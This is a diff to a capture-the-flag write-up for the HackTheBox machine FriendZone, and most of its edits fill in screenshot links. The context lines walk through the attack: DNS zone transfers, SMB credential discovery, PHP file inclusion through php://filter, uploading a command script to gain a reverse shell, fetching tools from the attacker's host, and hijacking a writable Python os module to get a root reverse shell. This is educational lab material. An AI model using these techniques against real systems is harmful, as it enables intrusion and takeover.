@@ -1,5 +1,5 @@
 # FriendZone [HTB](https://app.hackthebox.com/machines/173)
-![friendzone-01]()
+![friendzone-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/friendzone-01.png)
 
 ## Recon
 
@@ -9,7 +9,7 @@ After adding the target to my `/etc/hosts` file I start scanning for open ports:
 nmap -p- --min-rate 10000 friendzone.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ports-02.png)
 
 
 Let's run a version detection scan againts the found ports:
@@ -18,9 +18,9 @@ Let's run a version detection scan againts the found ports:
 nmap -p 21,22,53,80,139,443,445 -sCV friendzone.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/nmap-res-03.png)
 
-![nmap-res-04]()
+![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/nmap-res-04.png)
 
 
 We have the following:
@@ -59,7 +59,7 @@ dig axfr friendzone.red @friendzone.htb
 
 The `friendzone.htb` domain rejected the zone transfer, but `friendzone.red` accepted the request:
 
-![red-zone-05]()
+![red-zone-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/zone-reg-05.png)
 
 
 We have a few intersting sub-domains here, we can see all of them are mapped to the `localhost` of the target. This can give us access to different internal resources based on the virtual routing of the target. I mapped them all to the external IP of the target in my `/etc/hosts` file.
@@ -77,7 +77,7 @@ First, I tried to list the available shares using a null session which works to 
 smbclient -N -L friendzone.htb
 ```
 
-![list-smb-06]()
+![list-smb-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/list-smb-06.png)
 
 
 So I tried to login with the null session to the available shares. 
@@ -91,12 +91,12 @@ Connecting to this share using a null session works, and we can see a file of `c
 smbclient -N \\\\friendzone.htb\\general
 ```
 
-![general-07]()
+![general-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/general-07.png)
 
 
 I copied this file over to my attack machine and opend it:
 
-![creds-08]()
+![creds-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/creds-08.png)
 
 
 We can't be certain what "thing" the file is referring too, but let's continue to the other shares.
@@ -106,7 +106,7 @@ We can't be certain what "thing" the file is referring too, but let's continue t
 
 We can connect to the share with a null session, but there is noting inside:
 
-![dev-empty-09]()
+![dev-empty-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/dev-empty-09.png)
 
 
 + Files 
@@ -117,7 +117,7 @@ Trying to connect to this share with a null session fails. Supplying the recentl
 smbclient -U 'admin%WORKWORKHhallelujah@#' \\\\friendzone.htb\\Files
 ```
 
-![files-fail-10]()
+![files-fail-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/files-fail-10.png)
 
 
 I ran `enum4linux` and `crackmapexec` as well, though it didnt lead to anything super useful. 
@@ -130,7 +130,7 @@ Let's check the FTP server.
 
 Trying to login with an `anonymous` session fails:
 
-![anon-fail-11]()
+![anon-fail-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/anon-fail-11.png)
 
 
 Trying to specify the credentials found earlier also fails. 
@@ -146,7 +146,7 @@ Let's move on to check the Apache server.
 
 If we open the site at `http://friendzone.htb/` we can see the following:
 
-![site-12]()
+![site-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/site-12.png)
 
 
 Not much to see or so here besides the new mentioned domain of `friendzoneportal.red`, I added it to `/etc/hosts` as well and ran another zone transfer with the following command: 
@@ -157,7 +157,7 @@ dig axfr @friendzone.htb friendzoneportal.red
 
 This resulted in the following:
 
-![zone-13]()
+![zone-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/zone-13.png)
 
 
 I added these new sub-domains to my `/etc/hosts` file and continued enumerating the site. 
@@ -173,7 +173,7 @@ ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/dire
 
 which resulted in the following:
 
-![ffuf-14]()
+![ffuf-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ffuf-14.png)
 
 
 Let's take a look at each entry:
@@ -182,14 +182,14 @@ Let's take a look at each entry:
 
 This is an empty directory:
 
-![wp-empty-15]()
+![wp-empty-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/wp-empty-15.png)
 
 
 + `http://friendzone.htb/robots.txt`
 
 This is simply a troll:
 
-![robots-16]()
+![robots-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/robots-16.png)
 
 
 I dont see much else to do with this site, let's move on to the HTTPS site. 
@@ -200,7 +200,7 @@ I dont see much else to do with this site, let's move on to the HTTPS site.
 
 If open the site at `https://friendzone.red/` we get the following meme:
 
-![meme-17]()
+![meme-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/meme-17.png)
 
 
 Not much to do here, So I ran another directory scan with the below command:
@@ -211,7 +211,7 @@ ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/dire
 
 Which resulted in the following:
 
-![ffuf-18]()
+![ffuf-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ffuf-18.png)
 
 
 Let's check each entry:
@@ -221,19 +221,19 @@ Let's check each entry:
 
 Another empty directory:
 
-![admin-empty-19]()
+![admin-empty-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/admin-empty-19.png)
 
 
 + `https://friendzone.red/js/`
 
 This one is not empty:
 
-![js-20]()
+![js-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/js-20.png)
 
 
 The inner directory reads as such:
 
-![js-inner-21]()
+![js-inner-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/js-inner-21.png)
 
 
 I [identified](https://hashes.com/en/tools/hash_identifier) the string as a base64 string, but decoding it doesn't lead to anything. Could just be a rabbit-hole.
@@ -258,12 +258,12 @@ All return a 404 status code.
 
 Does open, and returns the following:
 
-![admin-panel-22]()
+![admin-panel-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/admin-panel-22.png)
 
 
 Trying to use the credentials we found earlier seems to work, and bring the following page:
 
-![another-one-23]()
+![another-one-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/another-one-23.png)
 
 
 We know that we found another administration related sub-domain of `administrator1.friendzone.red` in the other zone tranfer we did, Let's try this one out:
@@ -272,17 +272,17 @@ We know that we found another administration related sub-domain of `administrato
 + `https://administrator1.friendzone.red`
 
 
-![admin-panel-24]()
+![admin-panel-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/admin-panel-24.png)
 
 
 If we use the credentials we found earlier of `admin : WORKWORKHhallelujah@#` we can get past the login form:
 
-![past-login-25]()
+![past-login-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/past-login-25.png)
 
 
 If we open the mentioned `/dashboard.php` file we see the following:
 
-![dashboard-26]()
+![dashboard-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/dashboard-26.png)
 
 
 The message talks about inclusion of image files, asking to supply the filename of the image to include via the `image_name` parameter. 
@@ -296,7 +296,7 @@ If we try to add the mentioned `image_name` parameter in a request like this:
 
 we get the following: 
 
-![ha-ha-27]()
+![ha-ha-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ha-ha-27.png)
 
 
 I tired to play with the parameters, I found that removing the `image_name` parameter doesn't break the application! We can remove it completely and still get the image. Doens't it go againt's what the message just said? Could this be a troll? 
@@ -310,7 +310,7 @@ But if we remove the `pagename` parameter, or replace the input with something e
 
 I wans't sure exaclty how to exploit this at this time, so I decided to take a look at the rest of the sub-domains we found earlier. I found that the `https://uploads.friendzone.red/` sub-domain is the only one that does open:
 
-![uploads-28]()
+![uploads-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/uploads-28.png)
 
 
 So we have two applications, one is for image uploads, and the other is for image inclusion, how to exploit this? 
@@ -326,7 +326,7 @@ ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/dire
 .txt -u https://uploads.friendzone.red/FUZZ -e .cgi,.txt,.xml,.html,.php
 ```
 
-![ffuf-31]()
+![ffuf-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ffuf-31.png)
 
 
 I immediately went for `https://uploads.friendzone.red/files/`, but it was empty. 
@@ -334,7 +334,7 @@ I immediately went for `https://uploads.friendzone.red/files/`, but it was empty
 
 We also had an `upload.php` file here as well:
 
-![what-31]()
+![what-31.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/what-31.5.png)
 
 
 Okay, I wasnt sure what to do with this, so I ran another directory scan, this time for the `administrator1.friendzone.red/` domain:
@@ -343,17 +343,17 @@ Okay, I wasnt sure what to do with this, so I ran another directory scan, this t
 ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://administrator1.friendzone.red/FUZZ -e .cgi,.txt,.xml,.html,.php
 ```
 
-![ffuf-32]()
+![ffuf-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ffuf-32.png)
 
 
 I went for the `image` direcotry, which does have two images:
 
-![images-dir-33]()
+![images-dir-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/images-dir-33.png)
 
 
 None of which is our uploaded `cat.jpg`. I tried to access this `b.jpg` image with the following request `https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=timestamp`:
 
-![b-img-34]()
+![b-img-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/b-img-34.png)
 
 
 Not our image. 
@@ -365,7 +365,7 @@ But then I noticed the `timestamp.php` file, it fits the `pagename` parameter, c
 `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=login`
 
 
-![wrong-35]()
+![wrong-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/wrong-35.png)
 
 
 So there is definitely some form of php script inclusion going on here, maybe something like this: `include($_GET["pagename"] . ".php")` ? 
@@ -377,7 +377,7 @@ We can try to get the source code for the `/dashboard.php` script using some php
 `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard` 
 
 
-![base64-36]()
+![base64-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/base64-36.png)
 
 
 Here is the decoder `dashboard.php` script:
@@ -463,7 +463,7 @@ We need to find another a way to upload files to the target, the only thing that
 
 Here is the smb shares listing for reference:
 
-![list-smb-06]()
+![list-smb-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/list-smb-06.png)
 
 
 We can see from the comment that the `Files` share is located at `/etc/Files`, so we can probably make a guess that the rest of the shares are also inside the `/etc` directory. 
@@ -485,7 +485,7 @@ And try to uplaod this to the share with this a one-liner:
 smbclient -N \\\\friendzone.htb\\Development -c 'put cmd.php test.php'
 ```
 
-![write-test-37]()
+![write-test-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/write-test-37.png)
 
 
 Yes we can write to the share! 
@@ -495,7 +495,7 @@ Now we should be able to access this script with a request like this:
 
 `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test&cmd=id`
 
-![id-38]()
+![id-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/id-38.png)
 
 
 It worked!
@@ -520,7 +520,7 @@ I just use Burp's Encoder to URL-encode the payload and send it via the followin
 
 Which gives me a shell:
 
-![shell-39]()
+![shell-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/shell-39.png)
 
 
 ## Privilege Escalation
@@ -540,7 +540,7 @@ Next, I start hunting for quick wins. I try to list any sudo permissions but I g
 find / -perm -4000 2>/dev/null
 ```
 
-![suid-40]()
+![suid-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/suid-40.png)
 
 
 This bianry looks unusual. I search online and I do find a privesc vulenrability for this binary, but only for versions below `4.86.2`. The target's version is `4.90.1`. 
@@ -548,7 +548,7 @@ This bianry looks unusual. I search online and I do find a privesc vulenrability
 
 So I shift gears and start looking around the filesystem. I start with the `/home` directory:
 
-![home-41]()
+![home-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/home-41.png)
 
 
 We have read access, inside we can find and read `user.txt`, but there is nothing that can help us elevate privileges. 
@@ -556,12 +556,12 @@ We have read access, inside we can find and read `user.txt`, but there is nothin
 
 Then I decided to look for any custom software inside the `/opt` directory:
 
-![opt-42]()
+![opt-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/opt-42.png)
 
 
 We can see a `server_admin` directory which contains a `reporter.py` script which is owned by root, and readable by everyone. It reads as such:
 
-![reporter-43]()
+![reporter-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/reporter-43.png)
 
 
 At the moment the script does nothing because it's mostly commented out. But in essence, it defines a command to execute via the `system()` method of the `os` module in pyhton.
@@ -572,13 +572,13 @@ Unfortunately, we can't edit the file, or replace it with our own version.
 
 I decided to leave this script alone for now and take a look at the `/var` directory, specifically I found the following file inside `/var/www`:
 
-![pass-44]()
+![pass-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/pass-44.png)
 
 
 This password works for the ssh:
 
 
-![ssh-45]()
+![ssh-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/ssh-45.png)
 
 
 ## Friend
@@ -607,7 +607,7 @@ wget http://10.10.14.101/pspy64 && chmod +x pspy64
 
 Here is the task:
 
-![task-46]()
+![task-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/task-46.png)
 
 
 We know that we don't have write access to the `/opt/server_admin` directory. But if we check the permissions to the python `os` module we will find that it's writable:
@@ -617,7 +617,7 @@ cd /usr/lib/python2.7/
 find -type f -writable -ls
 ```
 
-![writable-47]()
+![writable-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/writable-47.png)
 
 
 This is a Python [libarary hijacking vulnerability](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/). 
@@ -645,7 +645,7 @@ s.close()
 ```
 
 
-![edit-os-48]()
+![edit-os-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/edit-os-48.png)
 
 
 Then I save the file and close it, start my local listner with:
@@ -656,4 +656,4 @@ rlwrap nc -lnvp 443
 
 And wait for the connection, which came after a couple of minutes:
 
-![root-49]()
+![root-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/FriendZone/img/root-49.png)
